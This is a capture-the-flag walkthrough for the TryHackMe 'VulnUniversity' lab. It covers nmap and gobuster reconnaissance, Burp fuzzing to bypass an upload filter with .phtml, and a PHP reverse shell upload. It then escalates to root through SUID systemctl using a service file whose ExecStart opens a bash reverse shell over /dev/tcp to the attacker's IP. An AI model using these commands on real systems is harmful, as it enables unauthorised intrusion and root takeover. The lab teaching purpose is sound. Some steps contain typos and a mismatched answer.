# VulnUniversity

## Task one - Deploy the machine 
No answer needed

## Task two - Reconnaissance
The task requires student to use nmap to gather infomation on the target machine. 
1. There are many nmap "cheatsheets" online that you can use too
    cheatsheet: https://www.stationx.net/nmap-cheat-sheet/
2. Scan the box, how many ports are open?
        use the nmap command to scan all ports
    
        nmap -p- <insert machine ip> (Takes longer to scan the host) 
    
        nmap -Pn <insert machine ip> (Faster BUT disables host dicovery)-lists open ports
    
    answer: 6 
3. What version of the squid proxy is running on the machine?
    
        use the nmap command to scan services running on the target
    
        nmap -sV <insert machine ip>
    
        answer: 3.5.12 (subject to change)
4. How many ports will nmap scan if the flag -p-400 was used?
        The flag is used to specify the number of ports that will be scanned
    
        answer: 400 
5. Using the nmap flag -n what will it not resolve?
        The flag -n implies that nmap will never perform DNS resolution 
    
        answer: DNS
6. What is the most likely operating system this machine is running?
        The nmap flag for OS discovery is -A among others 
    
        nmap -A <insert machine ip> 
    
        answer: ubuntu (subject to change) 
7. What port is the web server running on?
    
         According to results acquired in 2 above, the web server runs on port 3333. 
    
        nmap -Pn <insert machine ip> 
    
        answer: 3333 (subject to change) 
8. Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)
    
        answer: completed
    
## Task three: Locate directories using gobuster
### Installation : sudo apt-get install gobuster 
Gobuster is a handy tool used by security professionals to bruteforce universal resource identifiers(URIs)(directories and files), DNS subdomains and virtual host names. 
This can as a handy reference tool when getting started with gobuster: https://www.kali.org/tools/gobuster/
This is a uri scanner primarily written in go that allows faster bruteforce compared to other offerings. It utilizes go language features including concurrency implementing multiple threads for quicker processing. It however lacks the recursive diretory exploration which can be compensated for by other scanners. 
    
We require wordlists to get started with gobuster but kali linux has those under /usr/share/wordlists used by various security tools including John the Ripper and Metasploit. 

What is the directory that has an upload form page?
 
    command: 
    gobuster dir -u http:// < ip > :<insert webserver port number> -w </usr/share/wordlists>

we are using port <insert port number above> since our earlier recon revealed that it was open and its services. The command reveals five directories and upon exploration, the /upload/ directory reveals an upload page. 

     answer: /internal/

## Task four: Compromise the webserver 
    
Now that we have found a vulnerability - form to upload files to a webserver - we can use it to upload and compromise the webserver. 

Try upload a few file types to the server, what common extension seems to be blocked? 

To find out the files that are not blocked, we will use burpsuite. https://portswigger.net/burp/pro/video-tutorials(you can learn how to use burpsuite here). We are going to fuzz the upload form using the intruder. To begin, make the wordlist with the following extensions. 
    
    command: cat php.txt - a file that contains: .php .php3 .php4 .php5 .phtml 
    
#### Burpsuite procedure
    i) configure burpsuite to intercept all browser traffic
    
    ii) upload file, and once the request is captured, send it to the intruder
    
    iii) navigate to the 'payloads' and select the 'sniper' attack type
    
    iv) click the 'positions' tab, find the filename and and 'add ยง'

Try upload a few file types to the server, what common extension seems to be blocked?
    
A manual bruteforce reveals that .php files are not allowed by the site. 

    answer: .php 
    
Run this attack, what extension is allowed?
    
Following the instructions results in results that show how different files are treated by the webserver. The only differeing file extensions is .phtml which has a response of 723 which indicates that it can be used to upload the reverse shell. 
 
    answer: .phtml
    
Now that we know the files accepted by the webserver, we can progress to upload a reverse shell to grant us access of the web server. A reverse shell basically works by being called on the remote host and forcing the remotehost(in this case the webserver) to make a connection to us. We will listen for incoming connections, upload our shell and have the webserver beacon control to us. 
    
The reverse php shell can be downloaded from here https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php. 

#### PHP reverse shell configuration 
    i) Edit the phpreverse shell file to be your tun0 ip i.e This is the IP you are assigned in teh machine connected to tryhack me machine: Visit: 
    http://10.10.10.10(make sure you are connected to the try hack me network) 
    
    ii) Edit the file extension to .phtml since the webserver allows uploads with the .phtml extension. 
    
    iii) Listen to incoming connections using: nc -lvnp 1234
  
    iv) Upload your shell and navigate to http://<ip>:3333/internal/uploads/php-reverse-shell.phtml - This will execute your payload
    
You can alternatively use the phpreverse shell provided by kali installations under: /usr/share/webshells/php. Copy the file to your machine directory and edit the copied file adding your IP. 
    
What is the name of the user who manages the webserver? You should have identified a connection in netcat where the webserver is trying to make connection to your machine
    Command: 
    cat /etc/passwd
    
    Answer: bill 
 
What is the user Flag? 
    Command: 
    cd /home/bill , cat user.txt
  
    Answer: 8bd7992fbe*****22a63361004cfcedb
    
## Task five: Privilege Escalation

The goal of this task is to escalate the rights/privileges that we have on the webserver i.e from a simple user to a superuser
    
SUID is a special file permission for executable files which enables other users to run the file with effective permissions of the file owner. Instead of the normal x which represents execute permissions, you will see an s (to indicate SUID) special permission for the user. If a file has been set as SUID by the root, other users can run  commands as root.     
   Command: find / -perm -u=s -type f 2>/dev/null
    
On the system, search for all SUID files. What file stands out?
    Answer: /bin/systemctl

Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?

Become root and get the last flag (/root/root.txt)

Create a system service to run arbitrary commands. 
    Service:: saved as root.service
    
    [Unit] 
    Description=root 
    
    [Service] 
    Type=simple 
    User=root 
    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<your IP address>/4444 0>&1' 
    
    [Install] 
    WantedBy=multiuser.target

Serve the root.service file to the webserver using a SimpleHTTPServer on port 80 
    
    sudo python -m SimpleHTTPServer 80 (on your machine) 
    
    wget http://<your ip address>root.service (on the webserver bash instance) 
    
Listen for any connections by the reverse shell service on port 4444
    
    nc -nlvp 4444 
    
Enable the service on the bash instance
    
    systemctl enable root.service 
    system enable root 
    
You should get a reverse shell on your netcat session as the root user 
    cd /root 
    cat root.txt 
   
    
    Answer: a58ff8579f0a9*******33a9966c7fd5
   
    
    
    

    
    
    

    
    
   
    
   
    




    




